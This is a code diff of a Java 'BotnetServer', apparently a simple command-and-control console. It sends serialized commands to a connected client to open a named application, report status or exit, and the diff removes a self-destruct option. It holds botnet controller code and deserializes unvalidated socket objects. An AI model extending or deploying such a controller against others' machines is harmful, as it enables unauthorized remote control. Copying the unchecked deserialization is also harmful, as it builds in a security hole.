@@ -4,7 +4,7 @@ import java.io.*;
 public class BotnetServer {
     // Properties
     private Socket socket;
-    private String MENU = "\n------\nEnter a Command name \n1)openApp\n2)status\n3)selfDestruct\n4)exit\n------\n";
+    private String MENU = "\n------\nEnter a Command name \n1)open app\n2)status\n3)exit\n------";
 
     //Constructor
     public BotnetServer(Socket socket){
@@ -18,6 +18,7 @@ public class BotnetServer {
      * @return - command constructed with instructions to send to Client
      */
     private Command create_command(String commandName){
+        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(System.in));
         //init command
         Command command = new Command(commandName);
 
@@ -25,21 +26,23 @@ public class BotnetServer {
         switch (command.getCommandName()){
             case "1":
                 command.setCommand("openApp");
-                command.setInstructions("open the app");
+                try {
+                    System.out.print(">App Name: ");
+                    String appName = bufferedReader.readLine();
+                    command.setInstructions(appName);
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
                 break;
             case "2":
                 command.setCommand("status");
                 command.setInstructions("show the status of the client");
                 break;
             case "3":
-                command.setCommand("selfDestruct");
-                command.setInstructions("close the connection of the client to the server");
-                break;
-            case "4":
                 command.setCommand("exit");
                 break;
             default:
-                System.out.println("not an input bro");
+                System.out.println(">Invalid Input");
                 break;
         }
         return command;
@@ -60,6 +63,7 @@ public class BotnetServer {
             //Print the options to the server
             System.out.println(MENU);
             //get the command name 1,2,3, or 4
+            System.out.print("> ");
             String commandName = stdIn.readLine();
             //generate a command
             Command command = create_command(commandName);
@@ -69,33 +73,32 @@ public class BotnetServer {
             // read an object from the client
             Command inCommand = (Command) in.readObject();
             
-            
             //**WHILE YOU CAN READ objects FROM THE socket STREAM */
-            while ((inCommand.getResponse()) != null) {
+            while (inCommand.getResponse() != null) {
                 //Print the response of the command that was processed by the client
-                System.out.println("Client: " + inCommand.getResponse());
+                System.out.println(">Client: " + inCommand.getResponse());
+                 //*If the output is bye close connection */
+                 if (inCommand.getResponse().equalsIgnoreCase("exiting")){
+                    System.out.println("[+]Closing connection");
+                    System.exit(0);
+                    break;
+                }
                 
                 //*determine output */
 
                 String outputLine = inCommand.getResponse();
 
-                //*If the output is bye close connection */
-                if (outputLine.equalsIgnoreCase("exiting")){
-                    break;
-                }
-
-                
                 //if the command ran with no error
                 if(!inCommand.getErrorStatus() && inCommand.getIsExecuted()){
                     //print the menu again
                     System.out.println(MENU);
                     //get the next command
+                    System.out.print("> ");
                     commandName = stdIn.readLine();
                     //generate the command
                     inCommand = create_command(commandName);
                     //send Command object to client
                     out.writeObject(inCommand);
-
                 }
 
                 try{
@@ -104,6 +107,10 @@ public class BotnetServer {
                 }catch (ClassNotFoundException cnfe){
                     System.err.println("BotnetServer: Problem reading object: class not found");
                     System.exit(1);
+                } catch (EOFException e) {
+                    // Handle EOFException when the client disconnects
+                    System.err.println("Client disconnected.");
+                    break; // Exit the loop
                 }
             }
             //*CLOSE CONNECTION IF YOU ARE DONE */
